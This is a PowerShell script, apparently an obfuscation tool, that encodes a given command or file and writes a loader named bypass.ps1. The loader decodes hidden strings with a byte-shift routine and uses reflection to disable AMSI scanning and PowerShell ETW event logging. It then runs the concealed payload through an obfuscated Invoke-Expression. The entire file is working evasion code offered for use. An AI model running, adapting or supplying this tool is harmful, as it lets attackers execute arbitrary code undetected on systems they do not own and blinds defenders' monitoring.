param([string] $c,[string] $f)

function encrypt($v){
    $y = 9
    while($y -gt 6){
        [Byte[]]$t = $v.clone()
        for ($x = 0; $x -lt $v.Count; $x++) {
            $t[$v.Count-$x-1] = $v[$x] - 3
        }
        $v = $t
        $y = $y - 1
    }
    return $v
}

$text1="[Byte[]]`$c = [System.Convert]::FromBase64String('"
$text2="');[Byte[]]`$d = [System.Convert]::FromBase64String('amNga0xgamQ4JWVmYGtYZGZrbDgla2VcZFxeWGVYRCVkXGtqcEo=');"+
"[Byte[]]`$e = [System.Convert]::FromBase64String('W1xjYFg9a2BlQGBqZFg=');"+
"[Byte[]]`$f = [System.Convert]::FromBase64String('XGlmOiVkXGtqcEo=');"+
"[Byte[]]`$g = [System.Convert]::FromBase64String('aVxbYG1maUdrZVxtPCVeZWBrZVxtPCVqWmBramZlXlhgOyVkXGtqcEo=');"+
"[Byte[]]`$h = [System.Convert]::FromBase64String('W1xjWVhlXFZk');"+
"[Byte[]]`$i = [System.Convert]::FromBase64String('aVxbYG1maUdeZkNuazxKRyVeZWBaWGlLJWVmYGtYZGZrbDgla2VcZFxeWGVYRCVkXGtqcEo=');"+
"[Byte[]]`$j = [System.Convert]::FromBase64String('aVxbYG1maUdua1w=');"+
"function O (`$v){"+
    "[Byte[]]`$t = `$v.clone();"+
    "for (`$x = 0; `$x -lt `$v.Count; `$x++) {"+
        "`$t[`$v.Count-`$x-1] = `$v[`$x] + 3;"+
    "}"+
    "return `$t;"+
"}"+
"`$y = 9;"+
"while(`$y -gt 6){"+
    "`$c = O(`$c);"+
    "`$d = O(`$d);"+
    "`$e = O(`$e);"+
    "`$f = O(`$f);"+
    "`$g = O(`$g);"+
    "`$h = O(`$h);"+
    "`$i = O(`$i);"+
    "`$j = O(`$j);"+
    "`$y = `$y - 1;"+
"}"+
"`$cc = [System.Text.Encoding]::ASCII.GetString(`$c);"+
"[Ref].Assembly.GetType([System.Text.Encoding]::ASCII.GetString(`$d)).GetField([System.Text.Encoding]::ASCII.GetString(`$e),'NonPublic, Static').SetValue(`$null, `$true);"+
"[Reflection.Assembly]::LoadWithPartialName([System.Text.Encoding]::ASCII.GetString(`$f)).GetType([System.Text.Encoding]::ASCII.GetString(`$g)).GetField([System.Text.Encoding]::ASCII.GetString(`$h),'NonPublic, Instance').SetValue([Ref].Assembly.GetType([System.Text.Encoding]::ASCII.GetString(`$i)).GetField([System.Text.Encoding]::ASCII.GetString(`$j),'NonPublic, Static').GetValue(`$null),0);"+
"i``ex(`$cc);"

If(![String]::IsNullOrEmpty($c) -and [String]::IsNullOrEmpty($f)){
    $result = encrypt([System.Text.Encoding]::ASCII.GetBytes($c))
    write-output ($text1 + [Convert]::ToBase64String($result) + $text2) | out-file -filepath bypass.ps1
    Write-Host("[+] obfuscation result has been saved in bypass.ps1")
}elseif(![String]::IsNullOrEmpty($f) -and [String]::IsNullOrEmpty($c)){
    $stream = [System.IO.StreamReader]::new($f)
    $file = ""
    while( -not $stream.EndOfStream) {
        $file = $file + $stream.ReadLine() + "`n"
    }
    $result = encrypt([System.Text.Encoding]::ASCII.GetBytes($file))
    write-output ($text1 + [Convert]::ToBase64String($result) + $text2) | out-file -filepath bypass.ps1
    Write-Host("[+] obfuscation result has been saved in bypass.ps1")
}else{
    Write-Host("./powershell-obfuscation.ps1 [-c/-f] [command/filepath]")   
}
